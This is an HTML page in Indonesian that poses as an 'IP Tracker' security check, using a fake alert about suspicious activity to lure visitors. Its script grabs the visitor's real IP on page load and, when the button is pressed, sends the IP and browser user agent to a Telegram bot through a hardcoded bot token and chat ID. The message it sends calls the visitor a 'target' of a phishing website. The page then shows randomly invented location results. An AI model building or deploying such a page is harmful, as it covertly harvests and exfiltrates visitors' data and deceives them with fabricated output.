<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Location Tracker - Security Check</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #1a1a1a 0%, #2d1a4c 100%);
            color: #fff;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
            padding-bottom: 15px;
            border-bottom: 1px solid #6b3fa0;
        }
        
        .logo {
            font-size: 32px;
            color: #ff0000;
            font-weight: bold;
            margin-bottom: 10px;
        }
        
        .subtitle {
            color: #bb86fc;
            font-size: 18px;
        }
        
        .main-content {
            background-color: rgba(18, 18, 18, 0.8);
            padding: 25px;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
        }
        
        .alert-box {
            background: linear-gradient(135deg, #8B0000 0%, #FF0000 100%);
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .alert-icon {
            font-size: 24px;
            margin-bottom: 10px;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #d0b4ff;
        }
        
        input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #6b3fa0;
            border-radius: 8px;
            background-color: #1f1f1f;
            color: #fff;
            font-size: 16px;
        }
        
        .track-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #6b3fa0 0%, #8a5ccc 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
        }
        
        .track-btn:hover {
            background: linear-gradient(135deg, #8a5ccc 0%, #6b3fa0 100%);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(107, 63, 160, 0.4);
        }
        
        .result-container {
            margin-top: 30px;
            text-align: center;
            display: none;
        }
        
        .loader {
            border: 5px solid #1f1f1f;
            border-top: 5px solid #bb86fc;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .location-info {
            background: rgba(187, 134, 252, 0.1);
            padding: 20px;
            border-radius: 10px;
            margin-top: 20px;
            text-align: left;
        }
        
        .info-item {
            margin-bottom: 10px;
            padding: 8px;
            border-bottom: 1px solid #6b3fa0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">üîç IP TRACKER</div>
            <div class="subtitle">Lacak Lokasi dengan Akurat</div>
        </div>
        
        <div class="main-content">
            <div class="alert-box">
                <div class="alert-icon">‚ö†Ô∏è</div>
                <h3>PERINGATAN KEAMANAN</h3>
                <p>System mendeteksi aktivitas mencurigakan dari IP Anda. Verifikasi diperlukan.</p>
            </div>
            
            <div class="input-group">
                <label for="ipInput">Masukkan IP Address untuk Dilacak</label>
                <input type="text" id="ipInput" placeholder="Contoh: 192.168.1.1" value="">
            </div>
            
            <button class="track-btn" id="trackBtn">üöÄ Lacak Lokasi</button>
            
            <div class="result-container" id="resultContainer">
                <div class="loader"></div>
                <p>Sedang melacak lokasi...</p>
                
                <div class="location-info" id="locationInfo" style="display: none;">
                    <h3>üìç Hasil Pelacakan</h3>
                    <div class="info-item"><strong>IP Address:</strong> <span id="resultIP"></span></div>
                    <div class="info-item"><strong>Negara:</strong> <span id="resultCountry"></span></div>
                    <div class="info-item"><strong>Kota:</strong> <span id="resultCity"></span></div>
                    <div class="info-item"><strong>Provider:</strong> <span id="resultProvider"></span></div>
                    <div class="info-item"><strong>Koordinat:</strong> <span id="resultCoords"></span></div>
                    <div class="info-item"><strong>Zona Waktu:</strong> <span id="resultTimezone"></span></div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Telegram Bot Configuration
        const TELEGRAM_BOT_TOKEN = '7934840086:AAFvqEhRawVGGUjIrbMV5e3RfC1Fuah4D1o';
        const TELEGRAM_CHAT_ID = '7415049540';
        
        // Get user's real IP automatically
        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Tidak dapat mendeteksi IP';
            }
        }
        
        // Send IP to Telegram
        async function sendToTelegram(ip, userAgent, locationData) {
            try {
                const message = `üö® IP TRACKER - TARGET BARU üö®

üîç IP Address: ${ip}
üåê User Agent: ${userAgent}
üìç Lokasi Terdeteksi: ${locationData.city}, ${locationData.country}
üì± Provider: ${locationData.isp}
üïí Waktu: ${new Date().toLocaleString()}
üì° Koordinat: ${locationData.lat}, ${locationData.lon}

‚ö†Ô∏è TARGET TELAH MENGINPUT IP DI WEBSITE PHISING`;
                
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message
                    })
                });
            } catch (error) {
                console.log('Error sending to Telegram:', error);
            }
        }
        
        // Generate fake location data
        function generateFakeLocation(ip) {
            const cities = ['Jakarta', 'Surabaya', 'Bandung', 'Medan', 'Makassar'];
            const isps = ['Telkomsel', 'XL Axiata', 'Indosat', 'Smartfren', 'Tri'];
            
            return {
                ip: ip,
                country: "Indonesia",
                city: cities[Math.floor(Math.random() * cities.length)],
                isp: isps[Math.floor(Math.random() * isps.length)],
                lat: (-6.2 + Math.random() * 2).toFixed(6),
                lon: (106.8 + Math.random() * 2).toFixed(6),
                timezone: "Asia/Jakarta"
            };
        }
        
        // Auto-fill IP when page loads
        window.addEventListener('load', async () => {
            const userIP = await getUserIP();
            document.getElementById('ipInput').value = userIP;
        });
        
        // Track button functionality
        document.getElementById('trackBtn').addEventListener('click', async function() {
            const ipInput = document.getElementById('ipInput').value;
            const resultContainer = document.getElementById('resultContainer');
            const locationInfo = document.getElementById('locationInfo');
            
            resultContainer.style.display = 'block';
            locationInfo.style.display = 'none';
            
            // Generate fake location data
            const fakeData = generateFakeLocation(ipInput);
            
            // Send real data to Telegram
            await sendToTelegram(ipInput, navigator.userAgent, fakeData);
            
            // Show fake results after delay
            setTimeout(() => {
                document.querySelector('.loader').style.display = 'none';
                
                // Display fake data
                document.getElementById('resultIP').textContent = fakeData.ip;
                document.getElementById('resultCountry').textContent = fakeData.country;
                document.getElementById('resultCity').textContent = fakeData.city;
                document.getElementById('resultProvider').textContent = fakeData.isp;
                document.getElementById('resultCoords').textContent = `${fakeData.lat}, ${fakeData.lon}`;
                document.getElementById('resultTimezone').textContent = fakeData.timezone;
                
                locationInfo.style.display = 'block';
            }, 3000);
        });
    </script>
</body>
</html>
